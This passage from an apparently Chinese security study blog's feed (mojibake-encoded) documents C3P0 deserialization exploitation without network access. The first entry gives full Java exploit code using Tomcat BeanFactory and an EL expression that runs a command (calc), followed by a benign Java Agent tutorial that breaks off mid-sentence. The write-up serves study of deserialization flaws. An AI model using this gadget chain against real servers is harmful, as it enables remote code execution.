title="C3P0ä¸å‡ºç½‘åˆ©ç”¨"></a>C3P0ä¸å‡ºç½‘åˆ©ç”¨</h1><p>C3P0ä¸å‡ºç½‘çš„åˆ©ç”¨æ¡ä»¶è¾ƒä¸ºè‹›åˆ»ï¼Œè€Œä¸”éœ€è¦å­˜åœ¨Tomcat8çš„ä¾èµ–ç¯å¢ƒ</p><p>è·Ÿjndié«˜ç‰ˆæœ¬ç»•è¿‡ç±»ä¼¼ï¼Œä½†æ˜¯jndié«˜ç‰ˆæœ¬ç»•è¿‡è¿˜æ²¡å­¦ï¼Œä½“ä¼šä¸åˆ°ï¼Œæ‰€ä»¥å…ˆç©ºä¸€ä¸‹åˆ°æ—¶å†è¡¥ğŸ«¡</p><p>åäºŒæœˆä»½æœ‰æœºä¼šæ¥è¡¥ä¸€ä¸‹äº†ğŸ«¡</p><p>jdniçš„é«˜ç‰ˆæœ¬ç»•è¿‡ä¸­ï¼Œæˆ‘ä»¬çŸ¥é“æœ‰ä¸€ç§æ–¹å¼å°±æ˜¯åˆ©ç”¨Tomcatçš„BeanFactoryçš„getObjectInstaceæ–¹æ³•ï¼Œæ¥è¿›è¡ŒELè¡¨è¾¾å¼çš„æ³¨å…¥</p><p>å›å¤´çœ‹å‰é¢è¿œç¨‹ç±»åŠ è½½ä¸­çš„ReferenceableUtils#referenceToObjectæ–¹æ³•</p><p><img src="https://cdn.clown2024.cn/image-20241203204529365.png" alt="image-20241203204529365"></p><p>æ¬¸å¯ä»¥å‘ç°ï¼Œè¿™é‡Œå®Œç¾çš„ç¬¦åˆjndié«˜ç‰ˆæœ¬ç»•è¿‡çš„æ–¹å¼ï¼Œåªè¦å°†è¿™ä¸ªFactoryè®¾ç½®ä¸ºBeanFactoryå³å¯ï¼Œç„¶åå°±å¯ä»¥åœ¨ä¸å‡ºç½‘çš„æƒ…å†µä¸‹è¿›è¡Œjndiæ³¨å…¥äº†</p><p>å…ˆå¯¼å…¥ä¸‹é¢ä¸‰ä¸ªç±»æ–¹ä¾¿åˆ©ç”¨æµ‹è¯•</p><figure class="highlight xml"><table><tr><td class="code"><pre><code class="hljs xml"> <span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-catalina<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.55<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-el-api<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>      <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.55<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">dependency</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.apache.tomcat<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>tomcat-jasper-el<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>     <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>8.5.55<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br><span class="hljs-tag">&lt;/<span class="hljs-name">dependency</span>&gt;</span><br></code></pre></td></tr></table></figure><h2 id="åˆ©ç”¨é“¾æ„é€ "><a href="#åˆ©ç”¨é“¾æ„é€ -3" class="headerlink" title="åˆ©ç”¨é“¾æ„é€ "></a>åˆ©ç”¨é“¾æ„é€ </h2><p>æˆ‘ä»¬çŸ¥é“BeanFactoryéœ€è¦ä¼ å…¥ResourceRefç±»ï¼Œæˆ‘ä»¬åœ¨getReferenceæ–¹æ³•ä¸­è¿”å›ResourceRefå³å¯</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.exp;<br><br><span class="hljs-keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;<br><span class="hljs-keyword">import</span> org.apache.naming.ResourceRef;<br><br><span class="hljs-keyword">import</span> javax.naming.NamingException;<br><span class="hljs-keyword">import</span> javax.naming.Reference;<br><span class="hljs-keyword">import</span> javax.naming.Referenceable;<br><span class="hljs-keyword">import</span> javax.naming.StringRefAddr;<br><span class="hljs-keyword">import</span> javax.sql.ConnectionPoolDataSource;<br><span class="hljs-keyword">import</span> javax.sql.PooledConnection;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.sql.SQLException;<br><span class="hljs-keyword">import</span> java.sql.SQLFeatureNotSupportedException;<br><span class="hljs-keyword">import</span> java.util.logging.Logger;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">NoInternet_Attack</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">EXP_Loader</span> <span class="hljs-keyword">implements</span> <span class="hljs-title class_">ConnectionPoolDataSource</span>, Referenceable &#123;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Reference <span class="hljs-title function_">getReference</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> NamingException &#123;<br>            <span class="hljs-comment">// å®ä¾‹åŒ–Referenceï¼ŒæŒ‡å®šç›®æ ‡ç±»ä¸ºjavax.el.ELProcessorï¼Œå·¥å‚ç±»ä¸ºorg.apache.naming.factory.BeanFactory</span><br>            <span class="hljs-type">ResourceRef</span> <span class="hljs-variable">ref</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ResourceRef</span>(<span class="hljs-string">&quot;javax.el.ELProcessor&quot;</span>, <span class="hljs-literal">null</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-string">&quot;&quot;</span>, <span class="hljs-literal">true</span>,<span class="hljs-string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>,<span class="hljs-literal">null</span>);<br>            <span class="hljs-comment">// å¼ºåˆ¶å°†&#x27;x&#x27;å±æ€§çš„setterä»&#x27;setX&#x27;å˜ä¸º&#x27;eval&#x27;, è¯¦ç»†é€»è¾‘è§BeanFactory.getObjectInstanceä»£ç </span><br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;forceString&quot;</span>, <span class="hljs-string">&quot;x=eval&quot;</span>));<br>            <span class="hljs-comment">// åˆ©ç”¨è¡¨è¾¾å¼æ‰§è¡Œå‘½ä»¤</span><br>            ref.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">StringRefAddr</span>(<span class="hljs-string">&quot;x&quot;</span>, <span class="hljs-string">&quot;\&quot;\&quot;.getClass().forName(\&quot;javax.script.ScriptEngineManager\&quot;).newInstance().getEngineByName(\&quot;JavaScript\&quot;).eval(\&quot;new java.lang.ProcessBuilder[&#x27;(java.lang.String[])&#x27;]([&#x27;calc&#x27;]).start()\&quot;)&quot;</span>));<br>            <span class="hljs-keyword">return</span> ref;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PooledConnection <span class="hljs-title function_">getPooledConnection</span><span class="hljs-params">(String user, String password)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> PrintWriter <span class="hljs-title function_">getLogWriter</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLogWriter</span><span class="hljs-params">(PrintWriter out)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setLoginTimeout</span><span class="hljs-params">(<span class="hljs-type">int</span> seconds)</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br><br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> <span class="hljs-type">int</span> <span class="hljs-title function_">getLoginTimeout</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>        &#125;<br><br>        <span class="hljs-meta">@Override</span><br>        <span class="hljs-keyword">public</span> Logger <span class="hljs-title function_">getParentLogger</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> SQLFeatureNotSupportedException &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-literal">null</span>;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">//åºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Serial</span><span class="hljs-params">(ConnectionPoolDataSource c)</span> <span class="hljs-keyword">throws</span> NoSuchFieldException, IllegalAccessException, IOException &#123;<br>        <span class="hljs-comment">//åå°„ä¿®æ”¹connectionPoolDataSourceå±æ€§å€¼ä¸ºæˆ‘ä»¬çš„æ¶æ„ConnectionPoolDataSourceç±»</span><br>        <span class="hljs-type">PoolBackedDataSourceBase</span> <span class="hljs-variable">poolBackedDataSourceBase</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">PoolBackedDataSourceBase</span>(<span class="hljs-literal">false</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">cls</span> <span class="hljs-operator">=</span> poolBackedDataSourceBase.getClass();<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> cls.getDeclaredField(<span class="hljs-string">&quot;connectionPoolDataSource&quot;</span>);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(poolBackedDataSourceBase,c);<br><br>        <span class="hljs-comment">//åºåˆ—åŒ–æµå†™å…¥æ–‡ä»¶</span><br>        <span class="hljs-type">FileOutputStream</span> <span class="hljs-variable">fos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(fos);<br>        oos.writeObject(poolBackedDataSourceBase);<br><br>    &#125;<br><br>    <span class="hljs-comment">//ååºåˆ—åŒ–</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">Pool_Deserial</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException, ClassNotFoundException &#123;<br>        <span class="hljs-type">FileInputStream</span> <span class="hljs-variable">fis</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;exp.bin&quot;</span>));<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(fis);<br>        objectInputStream.readObject();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> IOException, NoSuchFieldException, IllegalAccessException, ClassNotFoundException &#123;<br>        <span class="hljs-type">EXP_Loader</span> <span class="hljs-variable">exp_loader</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">EXP_Loader</span>();<br>        Pool_Serial(exp_loader);<br>        Pool_Deserial();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241203210853776.png" alt="image-20241203210853776"></p><h1 id="å‚è€ƒ"><a href="#å‚è€ƒ" class="headerlink" title="å‚è€ƒ"></a>å‚è€ƒ</h1><p><a href="https://goodapple.top/archives/1749">https://goodapple.top/archives/1749</a></p><p><a href="https://forum.butian.net/share/2868">https://forum.butian.net/share/2868</a></p>]]></content>
      
      
      <categories>
          
          <category> java </category>
          
      </categories>
      
      
        <tags>
            
            <tag> java </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Java Agentå­¦ä¹ </title>
      <link href="/2024/10/30/Java-Agent%E5%AD%A6%E4%B9%A0/"/>
      <url>/2024/10/30/Java-Agent%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="java-agentä»‹ç»"><a href="#Java-Agentä»‹ç»" class="headerlink" title="Java Agentä»‹ç»"></a>Java Agentä»‹ç»</h1><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://docs.oracle.com/javase/10/docs/api/java/lang/instrument/package-summary.html">https://docs.oracle.com/javase/10/docs/api/java/lang/instrument/package-summary.html</a></p><p>java agentå°±æ˜¯ä¸€ç§èƒ½å¤Ÿåœ¨ä¸å½±å“æ­£å¸¸ç¼–è¯‘çš„æƒ…å†µä¸‹ï¼Œä¿®æ”¹javaå­—èŠ‚ç ï¼Œè¿›è€ŒåŠ¨æ€åœ°ä¿®æ”¹å·²åŠ è½½æˆ–æœªåŠ è½½çš„ç±»ã€å±æ€§å’Œæ–¹æ³•çš„æŠ€æœ¯ã€‚ä¹Ÿå°±æ˜¯å¹³æ—¶æ‰€è¯´çš„æ’æ¡©æŠ€æœ¯ï¼Œå¹³å¸¸çš„çƒ­éƒ¨ç½²ã€è¯Šæ–­å·¥å…·éƒ½æ˜¯åŸºäºJava AgentæŠ€æœ¯æ¥å®ç°çš„ã€‚è¯¥æŠ€æœ¯ä»JDK1.5å¼€å§‹å¼•å…¥ã€‚</p><h1 id="java-agentä½¿ç”¨"><a href="#Java-Agentä½¿ç”¨" class="headerlink" title="Java Agentä½¿ç”¨"></a>Java Agentä½¿ç”¨</h1><p>Java Agentåˆ†ä¸ºä¸¤ç§ï¼Œä¸€ç§æ˜¯åœ¨JVMå¯åŠ¨å‰åŠ è½½çš„premain-Agentï¼Œå¦ä¸€ç§æ˜¯JVMå¯åŠ¨ååŠ è½½çš„agentmain-Agentï¼Œæœ‰ç‚¹ç±»ä¼¼ç‰¹æ®Šçš„æ‹¦æˆªå™¨çš„æ ·å­ã€‚</p><h2 id="premain-agent"><a href="#premain-Agent" class="headerlink" title="premain-Agent"></a>premain-Agent</h2><p>å®ç°è¯¥Agenté¦–å…ˆæˆ‘ä»¬å¿…é¡»å®ç°ä¸€ä¸ªé™æ€premainæ–¹æ³•ï¼ŒåŒæ—¶æˆ‘ä»¬jaræ–‡ä»¶çš„æ¸…å•(mainfest)ä¸­å¿…é¡»è¦æœ‰Premain-Classå±æ€§ï¼Œä¹Ÿå°±æ˜¯jaråŒ…ä¸­å¸¸è§åˆ°çš„MFæ–‡ä»¶ï¼Œè¿™ä»å®˜æ–¹æ–‡æ¡£ä¸­å¯ä»¥å¾—çŸ¥</p><p><img src="https://cdn.clown2024.cn/image-20241030211341318.png" alt="image-20241030211341318"></p><p>å¯ä»¥çŸ¥é“ï¼Œå°±æ˜¯åœ¨æ‰§è¡Œmainæ–¹æ³•å‰æ‰§è¡Œæˆ‘ä»¬çš„premainæ–¹æ³•ï¼Œæ‰§è¡Œçš„ç±»å°±æ˜¯æˆ‘ä»¬Premain-Classå±æ€§çš„å€¼</p><p>ç°åœ¨æ¥å®ç°ä¸€ä¸ªç®€å•çš„premain-Agentï¼Œå…ˆæ­£å¸¸mavenåˆ›å»ºä¸€ä¸ªæ™®é€šçš„é¡¹ç›®</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">premainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">premain</span><span class="hljs-params">(String agentArgs, Instrumentation inst)</span> &#123;<br>        <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i=<span class="hljs-number">0</span>;i&lt;<span class="hljs-number">10</span>;i++)&#123;<br>            System.out.printf(<span class="hljs-string">&quot;è°ƒç”¨äº†JavaAgent%dæ¬¡\n&quot;</span>,i);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>æ¥ç€åœ¨ <code>resources/META-INF/</code> ä¸‹åˆ›å»º <code>MANIFEST.MF</code> æ¸…å•æ–‡ä»¶ç”¨ä»¥æŒ‡å®š <code>premain-Agent</code> çš„å¯åŠ¨ç±»</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Premain-Class: org.example.Agent.premainAgent<br><br></code></pre></td></tr></table></figure><blockquote><p>è¦æ³¨æ„è¯¥æ–‡ä»¶æœ€åä¸€å®šè¦å¤šä¸€ä¸ªæ¢è¡Œï¼Œä¸ç„¶ä¼šçˆ†çº¢</p></blockquote><p>ç›®å‰çš„ç›®å½•ç»“æ„å¦‚ä¸‹ï¼š</p><p><img src="https://cdn.clown2024.cn/image-20241030213350306.png" alt="image-20241030213350306"></p><p>ç„¶åæˆ‘ä»¬å°†è¯¥æ–‡ä»¶æ‰“æˆjaråŒ…ï¼Œè¿™é‡Œè®°å½•ä¸¤ç§æ‰“åŒ…æ–¹å¼</p><p><strong>ç”¨jarå‘½ä»¤æ‰“åŒ…</strong></p><p>æ‰“åŒ…å‰æˆ‘ä»¬éœ€è¦å°†javaæ–‡ä»¶æ›¿æ¢æˆæˆ‘ä»¬ç¼–è¯‘å¥½çš„classæ–‡ä»¶ï¼Œå› ä¸ºjarå‘½ä»¤å°±åªæ˜¯å°†æ–‡ä»¶æ‰“åŒ…æˆä¸€ä¸ªjarï¼Œå¹¶ä¸ä¼šè¿›è¡Œç¼–è¯‘ï¼Œè€ŒjaråŒ…çš„æ–‡ä»¶æƒ³è¦è¢«JVMè¯†åˆ«å°±éœ€è¦æ˜¯classæ–‡ä»¶</p><p>ç„¶åå¯¹srcç›®å½•çš„æ‰€æœ‰æ–‡ä»¶æ‰“åŒ…</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd"><span class="hljs-function">D:\<span class="hljs-title">CTF</span>\<span class="hljs-title">Java</span>\<span class="hljs-title">JavaCode</span>\<span class="hljs-title">JavaAgent</span>\<span class="hljs-title">src</span>\<span class="hljs-title">main</span>&gt;<span class="hljs-title">jar</span> <span class="hljs-title">cvfm</span> ..\..\<span class="hljs-title">agent.jar</span> <span class="hljs-title">resources</span>/<span class="hljs-title">META</span>-<span class="hljs-title">INF</span>/<span class="hljs-title">MANIFEST.MF</span> ..\..\<span class="hljs-title">src</span></span><br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030220310229.png" alt="image-20241030220310229"></p><p><img src="https://cdn.clown2024.cn/image-20241030220348113.png" alt="image-20241030220348113"></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">å‚æ•°è¯´æ˜ï¼š<br>cï¼šåˆ›å»ºæ–°çš„ JAR æ–‡ä»¶ã€‚<br>vï¼šç”Ÿæˆè¯¦ç»†è¾“å‡ºï¼Œä»¥ä¾¿æŸ¥çœ‹æ­£åœ¨æ‰§è¡Œçš„æ“ä½œã€‚<br>fï¼šæŒ‡å®š JAR æ–‡ä»¶çš„åç§°ã€‚<br>mï¼šæŒ‡å®š MANIFEST.MF æ–‡ä»¶çš„ä½ç½®ã€‚<br></code></pre></td></tr></table></figure><p>ç„¶åå°±èƒ½çœ‹åˆ°æˆ‘ä»¬çš„agent.jaråŒ…äº†ï¼Œæˆ‘çœ‹æ–‡ç« ä¹Ÿå¯ä»¥ç›´æ¥æŒ‡å®šå•ä¸€classæ–‡ä»¶æ‰“æˆjaråŒ…ï¼Œä¾‹å¦‚è¿™æ ·</p><figure class="highlight cmd"><table><tr><td class="code"><pre><code class="hljs cmd">jar cvfm ..\..\agent1.jar resources/META-INF/MANIFEST.MF java\org\example\Agent\<br>premainAgent.class<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030220652347.png" alt="image-20241030220652347"></p><p>è¿™ç§æ‰“åŒ…æ–¹å¼ä¼šè‡ªåŠ¨ç»™ä½ åˆ›å»ºå¿…è¦çš„åŒ…è·¯å¾„ï¼Œå¯¹æ¯”äº†ä¸€ä¸‹ä¸¤ç§æ‰“åŒ…æ–¹å¼ï¼Œç›®å½•ç»“æ„å¦‚ä¸‹</p><p><img src="https://cdn.clown2024.cn/image-20241030220817921.png" alt="image-20241030220817921"></p><p>æŒ‡å®šclassæ–‡ä»¶æ‰“åŒ…çš„å°±æ˜¯ç›´æ¥ä»javaåŒ…å¼€å§‹åˆ›å»ºï¼Œåªåˆ›å»ºå¯»æ‰¾ç±»çš„å¿…è¦çš„åŒ…</p><p><img src="https://cdn.clown2024.cn/image-20241030220900229.png" alt="image-20241030220900229"></p><p>è€ŒæŒ‡å®šç›®å½•çš„æ–¹å¼å°±ä¼šä»æˆ‘ä»¬æŒ‡å®šçš„ç›®å½•å¼€å§‹æ‰“åŒ…ï¼Œéƒ½ä¼šåŒ…æ‹¬è¿›å»</p><p>é¡ºä¾¿ä¹Ÿè®°å½•ä¸€ä¸‹æœ‰å…³jarä¼šç”¨çš„ä¸Šçš„å…¶ä»–å‘½ä»¤ï¼š</p><ul><li><p>æ£€æŸ¥jaræ–‡ä»¶å†…å®¹ï¼šjar tvf agent.jar</p><p><img src="https://cdn.clown2024.cn/image-20241030221232096.png" alt="image-20241030221232096"></p></li></ul><p><strong>ä½¿ç”¨ideaæ‰“åŒ…</strong></p><p>è¿™ç§æ–¹å¼ä¸éœ€è¦æå‰ç¼–è¯‘ï¼Œä»–åœ¨buildçš„æ—¶å€™å°±ä¼šå¸®æˆ‘ä»¬ç¼–è¯‘</p><p>æˆ‘ä»¬é€‰æ‹©é€‰æ‹©<code>Project Structure</code> -&gt; <code>Artifacts</code> -&gt; <code>JAR</code> -&gt; <code>From modules with dependencies</code></p><p><img src="https://cdn.clown2024.cn/image-20241030221418303.png" alt="image-20241030221418303"></p><p><img src="https://cdn.clown2024.cn/image-20241030221442499.png" alt="image-20241030221442499"></p><p><img src="https://cdn.clown2024.cn/image-20241030221521466.png" alt="image-20241030221521466"></p><p>ç„¶åé€‰æ‹©é€‰æ‹©<code>Build</code> -&gt; <code>Build Artifacts</code> -&gt; <code>Build</code></p><p>ç„¶åå°±å¯ä»¥åœ¨outç›®å½•çœ‹åˆ°æˆ‘ä»¬ç”Ÿæˆçš„jaråŒ…äº†</p><p><img src="https://cdn.clown2024.cn/image-20241030221714027.png" alt="image-20241030221714027"></p><p>ç°åœ¨æˆ‘ä»¬çš„agentç±»å·²ç»åˆ›å»ºå¥½äº†ï¼Œæˆ‘ä»¬éœ€è¦å†åˆ›å»ºä¸€ä¸ªæ–°çš„ç›®æ ‡ç±»</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        System.out.println(<span class="hljs-string">&quot;Hello world!&quot;</span>);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒæ ·ä½¿ç”¨MFæ¥æ‰“åŒ…ï¼Œåˆ›å»ºä¸€ä¸ªMFæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Main-Class: org.example.Main<br><br></code></pre></td></tr></table></figure><p>ç„¶åæ‰“æˆjaråŒ…</p><p>ç°åœ¨æˆ‘ä»¬å°±å¾—åˆ°ä¸¤ä¸ªjaråŒ…</p><p><img src="https://cdn.clown2024.cn/image-20241030222419726.png" alt="image-20241030222419726"></p><p>ç„¶åæˆ‘ä»¬åªè¦æ·»åŠ ä¸€ä¸ªå‚æ•°å°±èƒ½åº”ç”¨agent.jaråŒ…ï¼Œæ ¼å¼åœ¨å®˜æ–¹æ–‡æ¡£ä¹Ÿæœ‰ï¼Œå¦‚ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">-javaagent:&lt;jarpath&gt;[=&lt;options&gt;]<br># optionsæ˜¯ä¼ é€’ç»™ä»£ç†çš„å‚æ•°ï¼Œpremainçš„agentArgså­—æ®µå°±æ˜¯ç”¨æ¥æ¥å—å‚æ•°çš„<br></code></pre></td></tr></table></figure><p>ç°åœ¨æ‰§è¡Œä¸‹é¢å‘½ä»¤è¿è¡Œ</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">java -javaagent:agent.jar -jar TestAgent.jar<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/image-20241030223732827.png" alt="image-20241030223732827"></p><h2 id="agentmain-agent"><a href="#agentmain-Agent" class="headerlink" title="agentmain-Agent"></a>agentmain-Agent</h2><p>agentmain-Agentå°±æ˜¯èƒ½å¤Ÿåœ¨JVMå¯åŠ¨ååŠ è½½å¹¶ä¿®æ”¹å­—èŠ‚ç </p><p>ç¼–å†™è¯¥ç±»éœ€è¦å®ç°agentmainæ–¹æ³•</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example.Agent;<br><br><span class="hljs-keyword">import</span> java.lang.instrument.Instrumentation;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">agentmainAgent</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">agentmain</span><span class="hljs-params">(String args, Instrumentation inst)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;è°ƒç”¨äº†agentmain-Agent!&quot;</span>);<br>            sleep(<span class="hljs-number">3000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>åŒæ ·å†™ä¸€ä¸ªMFæ–‡ä»¶</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs MF">Manifest-Version: 1.0<br>Agent-Class: org.example.Agent.agentmainAgent<br><br></code></pre></td></tr></table></figure><p>ç„¶åå†™ä¸€ä¸ªä¸€ç›´è¿è¡Œçš„ç›®æ ‡ç±»æ–¹ä¾¿è§‚å¯Ÿç»“æœ</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.example;<br><br><span class="hljs-keyword">import</span> <span class="hljs-keyword">static</span> java.lang.Thread.sleep;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Main</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-keyword">while</span> (<span class="hljs-literal">true</span>)&#123;<br>            System.out.println(<span class="hljs-string">&quot;Hello World!&quot;</span>);<br>            sleep(<span class="hljs-number">5000</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯agentmainå°±ä¸æ˜¯é€šè¿‡å‘½ä»¤è¡ŒæŒ‡å®šå‚æ•°çš„å½¢å¼å¯åŠ¨äº†ï¼Œå®˜æ–¹ä¸ºäº†å®ç°å¯åŠ¨ååŠ 